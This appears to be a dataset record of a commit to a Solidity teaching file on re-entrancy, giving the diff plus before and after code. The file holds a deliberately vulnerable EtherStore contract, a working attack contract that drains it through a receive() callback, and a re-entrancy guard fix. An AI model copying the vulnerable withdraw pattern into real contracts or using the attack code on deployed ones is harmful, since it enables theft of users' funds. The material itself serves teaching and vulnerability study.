{"filename": "contracts/hacks/ReEntrancy.sol", "patch": "@@ -36,7 +36,7 @@ Here is how the functions were called\n contract EtherStore001 {\n     mapping(address => uint256) public balances;\n \n-    function deposit() public payable {\n+    function deposit() public payable virtual {\n         balances[msg.sender] += msg.value;\n     }\n \n@@ -69,7 +69,7 @@ contract Attack001 {\n         }\n     }\n \n-    function attack() external payable virtual {\n+    function attack() external payable {\n         require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n         etherStore.deposit{value: 1 ether}();\n         etherStore.withdraw();\n@@ -86,23 +86,80 @@ Preventative Techniques\n - Use function modifiers that prevent re-entrancy\n Here is a example of a re-entracy guard\n */\n-contract ReEntrancyGuard {\n-    bool internal locked;\n+abstract contract ReentrancyGuard {\n+    // Booleans are more expensive than uint256 or any type that takes up a full\n+    // word because each write operation emits an extra SLOAD to first read the\n+    // slot's contents, replace the bits taken up by the boolean, and then write\n+    // back. This is the compiler's defense against contract upgrades and\n+    // pointer aliasing, and it cannot be disabled.\n+\n+    // The values being non-zero value makes deployment a bit more expensive,\n+    // but in exchange the refund on every call to nonReentrant will be lower in\n+    // amount. Since refunds are capped to a percentage of the total\n+    // transaction's gas, it is best to keep them low in cases like this one, to\n+    // increase the likelihood of the full refund coming into effect.\n+    uint256 private constant _NOT_ENTERED = 1;\n+    uint256 private constant _ENTERED = 2;\n+\n+    uint256 private _status;\n+\n+    constructor() {\n+        _status = _NOT_ENTERED;\n+    }\n+\n+    /**\n+     * @dev Prevents a contract from calling itself, directly or indirectly.\n+     * Calling a `nonReentrant` function from another `nonReentrant`\n+     * function is not supported. It is possible to prevent this from happening\n+     * by making the `nonReentrant` function external, and making it call a\n+     * `private` function that does the actual work.\n+     */\n+    modifier nonReentrant() {\n+        // On the first call to nonReentrant, _notEntered will be true\n+        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n+\n+        // Any calls to nonReentrant after this point will fail\n+        _status = _ENTERED;\n \n-    modifier noReentrant() {\n-        require(!locked, \"No re-entrancy\");\n-        locked = true;\n         _;\n-        locked = false;\n+\n+        // By storing the original value once again, a refund is triggered (see\n+        // https://eips.ethereum.org/EIPS/eip-2200)\n+        _status = _NOT_ENTERED;\n     }\n }\n \n-contract SafeEtherStore001 is EtherStore001, ReEntrancyGuard {\n-    function withdraw() public override noReentrant {}\n+contract SafeEtherStore001 is EtherStore001, ReentrancyGuard {\n+    function deposit() public payable override nonReentrant {\n+        super.deposit();\n+    }\n+\n+    function withdraw() public override nonReentrant {\n+        super.withdraw();\n+    }\n }\n \n-contract Attack002 is Attack001 {\n-    constructor(address _safeEtherStore) Attack001(_safeEtherStore) {}\n+contract Attack002 {\n+    SafeEtherStore001 public safeEtherStore;\n+\n+    constructor(address _safeEtherStoreAddress) {\n+        safeEtherStore = SafeEtherStore001(_safeEtherStoreAddress);\n+    }\n+\n+    // Receive is called when EtherStore sends Ether to this contract.\n+    receive() external payable {\n+        if (address(safeEtherStore).balance >= 1 ether) {\n+            safeEtherStore.withdraw();\n+        }\n+    }\n+\n+    function attack() external payable {\n+        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n+        safeEtherStore.deposit{value: 1 ether}();\n+        safeEtherStore.withdraw();\n+    }\n \n-    function attack() external payable override {}\n+    function getBalance() public view returns (uint256) {\n+        return address(this).balance;\n+    }\n }", "project_link": "https://github.com/Dankimhaejun/solidity-by-example/commit/04cffb1e8c96dbd6034773543a0dd0a6059a3c0b", "bug_version": {"raw_code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nRe-Entrancy\nVulnerability\nLet's say that contract A calls contract B.\n\nReentracy exploit allows B to call back into A before A finishes execution.\n\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n */\ncontract EtherStore001 {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public virtual {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"No balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack001 {\n    EtherStore001 public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore001(_etherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable virtual {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/*\nPreventative Techniques\n- Ensure all state changes happen before calling external contracts\n- Use function modifiers that prevent re-entrancy\nHere is a example of a re-entracy guard\n*/\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\ncontract SafeEtherStore001 is EtherStore001, ReEntrancyGuard {\n    function withdraw() public override noReentrant {}\n}\n\ncontract Attack002 is Attack001 {\n    constructor(address _safeEtherStore) Attack001(_safeEtherStore) {}\n\n    function attack() external payable override {}\n}\n", "flattened_code": "// IGNORE_LICENSE-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nRe-Entrancy\nVulnerability\nLet's say that contract A calls contract B.\n\nReentracy exploit allows B to call back into A before A finishes execution.\n\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n */\ncontract EtherStore001 {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public virtual {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"No balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack001 {\n    EtherStore001 public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore001(_etherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable virtual {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/*\nPreventative Techniques\n- Ensure all state changes happen before calling external contracts\n- Use function modifiers that prevent re-entrancy\nHere is a example of a re-entracy guard\n*/\ncontract ReEntrancyGuard {\n    bool internal locked;\n\n    modifier noReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n}\n\ncontract SafeEtherStore001 is EtherStore001, ReEntrancyGuard {\n    function withdraw() public override noReentrant {}\n}\n\ncontract Attack002 is Attack001 {\n    constructor(address _safeEtherStore) Attack001(_safeEtherStore) {}\n\n    function attack() external payable override {}\n}\n", "commit_id": "7f54b0a09452010bd7af8d5b53ee2f7410bda47f"}, "fixed_version": {"raw_code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nRe-Entrancy\nVulnerability\nLet's say that contract A calls contract B.\n\nReentracy exploit allows B to call back into A before A finishes execution.\n\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n */\ncontract EtherStore001 {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable virtual {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public virtual {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"No balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack001 {\n    EtherStore001 public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore001(_etherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/*\nPreventative Techniques\n- Ensure all state changes happen before calling external contracts\n- Use function modifiers that prevent re-entrancy\nHere is a example of a re-entracy guard\n*/\nabstract contract ReentrancyGuard {\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n\n    uint256 private _status;\n\n    constructor() {\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        // On the first call to nonReentrant, _notEntered will be true\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n\n        // Any calls to nonReentrant after this point will fail\n        _status = _ENTERED;\n\n        _;\n\n        // By storing the original value once again, a refund is triggered (see\n        // https://eips.ethereum.org/EIPS/eip-2200)\n        _status = _NOT_ENTERED;\n    }\n}\n\ncontract SafeEtherStore001 is EtherStore001, ReentrancyGuard {\n    function deposit() public payable override nonReentrant {\n        super.deposit();\n    }\n\n    function withdraw() public override nonReentrant {\n        super.withdraw();\n    }\n}\n\ncontract Attack002 {\n    SafeEtherStore001 public safeEtherStore;\n\n    constructor(address _safeEtherStoreAddress) {\n        safeEtherStore = SafeEtherStore001(_safeEtherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(safeEtherStore).balance >= 1 ether) {\n            safeEtherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        safeEtherStore.deposit{value: 1 ether}();\n        safeEtherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n", "flattened_code": "// IGNORE_LICENSE-Identifier: MIT\npragma solidity ^0.8.13;\n\n/*\nRe-Entrancy\nVulnerability\nLet's say that contract A calls contract B.\n\nReentracy exploit allows B to call back into A before A finishes execution.\n\nEtherStore is a contract where you can deposit and withdraw ETH.\nThis contract is vulnerable to re-entrancy attack.\nLet's see why.\n\n1. Deploy EtherStore\n2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore\n3. Deploy Attack with address of EtherStore\n4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).\n   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,\n   plus 1 Ether sent from this contract).\n\nWhat happened?\nAttack was able to call EtherStore.withdraw multiple times before\nEtherStore.withdraw finished executing.\n\nHere is how the functions were called\n- Attack.attack\n- EtherStore.deposit\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack.fallback (receives 1 Ether)\n- EtherStore.withdraw\n- Attack fallback (receives 1 Ether)\n */\ncontract EtherStore001 {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable virtual {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() public virtual {\n        uint256 bal = balances[msg.sender];\n        require(bal > 0, \"No balance\");\n\n        (bool sent, ) = msg.sender.call{value: bal}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balances[msg.sender] = 0;\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack001 {\n    EtherStore001 public etherStore;\n\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore001(_etherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(etherStore).balance >= 1 ether) {\n            etherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        etherStore.deposit{value: 1 ether}();\n        etherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n/*\nPreventative Techniques\n- Ensure all state changes happen before calling external contracts\n- Use function modifiers that prevent re-entrancy\nHere is a example of a re-entracy guard\n*/\nabstract contract ReentrancyGuard {\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n    uint256 private constant _NOT_ENTERED = 1;\n    uint256 private constant _ENTERED = 2;\n\n    uint256 private _status;\n\n    constructor() {\n        _status = _NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        // On the first call to nonReentrant, _notEntered will be true\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\n\n        // Any calls to nonReentrant after this point will fail\n        _status = _ENTERED;\n\n        _;\n\n        // By storing the original value once again, a refund is triggered (see\n        // https://eips.ethereum.org/EIPS/eip-2200)\n        _status = _NOT_ENTERED;\n    }\n}\n\ncontract SafeEtherStore001 is EtherStore001, ReentrancyGuard {\n    function deposit() public payable override nonReentrant {\n        super.deposit();\n    }\n\n    function withdraw() public override nonReentrant {\n        super.withdraw();\n    }\n}\n\ncontract Attack002 {\n    SafeEtherStore001 public safeEtherStore;\n\n    constructor(address _safeEtherStoreAddress) {\n        safeEtherStore = SafeEtherStore001(_safeEtherStoreAddress);\n    }\n\n    // Receive is called when EtherStore sends Ether to this contract.\n    receive() external payable {\n        if (address(safeEtherStore).balance >= 1 ether) {\n            safeEtherStore.withdraw();\n        }\n    }\n\n    function attack() external payable {\n        require(msg.value >= 1 ether, \"Minimum is 1 ether\");\n        safeEtherStore.deposit{value: 1 ether}();\n        safeEtherStore.withdraw();\n    }\n\n    function getBalance() public view returns (uint256) {\n        return address(this).balance;\n    }\n}\n", "commit_id": "04cffb1e8c96dbd6034773543a0dd0a6059a3c0b"}}